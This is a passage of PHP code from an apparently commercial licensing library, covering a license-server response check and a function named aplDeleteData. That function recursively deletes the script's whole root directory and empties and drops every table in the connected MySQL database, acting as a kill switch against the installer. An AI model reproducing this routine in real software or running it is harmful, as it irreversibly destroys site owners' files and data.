    if (!empty($content)) //content received, do other tests
        {
        if (!aplIsEmpty(aplParseXmlTags($content, "notification_license_ok")) && aplVerifyServerSignature($content, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)) //everything OK
            {
            $notifications_array['notification_case']="notification_license_ok";
            $notifications_array['notification_text']=aplParseXmlTags($content, "notification_license_ok");
            }
        else //check failed
            {
            $notifications_array=aplParseLicenseNotifications($content); //parse <notification_case> along with message
            }
        }
    else //no content received
        {
        $notifications_array['notification_case']="notification_no_connection";
        $notifications_array['notification_text']=APL_NOTIFICATION_NO_CONNECTION;
        }

    return $notifications_array;
    }


//delete user data
function aplDeleteData($MYSQLI_LINK)
    {
    if (is_dir(APL_DIRECTORY))
        {
        $root_directory=realpath(APL_DIRECTORY."/.."); //since APL_DIRECTORY will be inside /SCRIPT directory (where apl_core_functions.php is located), go one level up to enter root directory of script

        foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator($root_directory, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST) as $path)
            {
            $path->isDir() && !$path->isLink() ? rmdir($path->getPathname()) : unlink($path->getPathname());
            }
        rmdir($root_directory);
        }

    if (APL_STORAGE=="DATABASE") //settings stored in database, delete MySQL data
        {
        $table_list_results=mysqli_query($MYSQLI_LINK, "SHOW TABLES"); //get list of tables in database
        while ($table_list_row=mysqli_fetch_row($table_list_results))
            {
            $database_tables_list[]=$table_list_row[0];
            }

        if (is_array($database_tables_list))
            {
            foreach ($database_tables_list as $table_name) //delete all data from tables first
                {
                mysqli_query($MYSQLI_LINK, "DELETE FROM $table_name");
                }

            foreach ($database_tables_list as $table_name) //now drop tables (do it later to prevent script from being aborted when no drop privileges are granted)
                {
                mysqli_query($MYSQLI_LINK, "DROP TABLE $table_name");
                }
            }
        }

    exit(); //abort further execution
    }
